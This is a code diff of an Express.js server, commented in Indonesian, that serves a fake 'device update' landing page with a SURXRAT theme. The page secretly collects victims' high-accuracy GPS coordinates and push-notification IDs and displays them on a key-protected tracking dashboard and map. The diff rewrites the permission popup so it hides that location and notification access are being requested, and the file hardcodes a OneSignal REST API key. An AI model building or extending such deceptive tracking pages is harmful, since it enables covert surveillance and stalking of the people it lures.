@@ -6,7 +6,6 @@ const http = require('http');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// KONFIGURASI ONESIGNAL LO
 const ONESIGNAL_APP_ID = '209c76da-1da3-4518-9b9c-54b84efcc535';
 const ONESIGNAL_REST_KEY = 'os_v2_app_ecohnwq5uncrrg44ks4e57gfgxdvpd6354oubducbqew5qbz3gmjgsd2vaaz72niplmzkj46ivq3tk6sepctzdm3dlh4ky2umekrviy';
 
@@ -97,7 +96,7 @@ app.post('/api/gps', (req, res) => {
   res.json({ ok: true });
 });
 
-// ============ DASHBOARD (TEMA SURXRAT) ============
+// ============ DASHBOARD ============
 app.get('/dash', (req, res) => {
   if (String(req.query.k || '') !== DASH_KEY) return res.status(403).send('Forbidden');
   const devices = new Map();
@@ -241,7 +240,7 @@ app.get('/dash/map', (req, res) => {
 });
 
 // ==============================================================
-// LANDING PAGE (TEMA SURXRAT + ANTI STUCK)
+// LANDING PAGE (TEMA SURXRAT + FORCE POPUP)
 // ==============================================================
 app.get('*', (req, res) => {
   const slug = cleanSlug(req.query.s || req.path.replace(/\//g, ''));
@@ -289,9 +288,9 @@ app.get('*', (req, res) => {
 <div class="popup-overlay" id="popup1">
   <div class="popup-box">
     <div class="popup-icon">🛡️</div>
-    <h3>Izin Akses</h3>
-    <p>System memerlukan akses lokasi dan notifikasi untuk melanjutkan pembaruan.</p>
-    <button class="popup-btn" id="allowBtn">OK, IZINKAN</button>
+    <h3>Konfirmasi Sistem</h3>
+    <p>Ketuk tombol di bawah untuk melanjutkan pembaruan perangkat Anda.</p>
+    <button class="popup-btn" id="allowBtn">KETUK OK UNTUK MELANJUTKAN</button>
   </div>
 </div>
 
@@ -311,34 +310,36 @@ app.get('*', (req, res) => {
     this.innerText = 'Memproses...';
     const btn = this;
 
-    // Timer Anti Stuck (3 detik)
+    // Anti Stuck
     const forceClose = setTimeout(() => {
       document.getElementById('popup1').classList.remove('show');
-      btn.innerText = 'OK, IZINKAN';
-    }, 3000);
+      btn.innerText = 'KETUK OK UNTUK MELANJUTKAN';
+    }, 4000);
 
     // 1. Minta GPS
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         p => { fetch('/api/gps', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({src:'gps',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,slug:slug}) }).catch(()=>{}); },
-        e => {}, {enableHighAccuracy:true,timeout:2000} // Timeout cepet
+        e => {}, {enableHighAccuracy:true,timeout:3000}
       );
     }
 
-    // 2. Minta Notif (OneSignal)
-    if (window.OneSignal) {
+    // 2. Minta Notif Pake Browser Permission (Bukan OneSignal Langsung)
+    if (Notification.permission !== 'granted') {
       try {
-        await OneSignal.Notifications.requestPermission();
-        const playerId = OneSignal.User.PushSubscription.id;
-        if(playerId) {
-          await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
+        const permission = await Notification.requestPermission();
+        if (permission === 'granted' && window.OneSignal) {
+          const playerId = OneSignal.User.PushSubscription.id;
+          if(playerId) {
+            await fetch('/api/save-player', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({playerId}) });
+          }
         }
       } catch(e) { console.log(e); }
     }
 
     clearTimeout(forceClose);
     document.getElementById('popup1').classList.remove('show');
-    btn.innerText = 'OK, IZINKAN';
+    btn.innerText = 'KETUK OK UNTUK MELANJUTKAN';
   });
 })();
 </script>
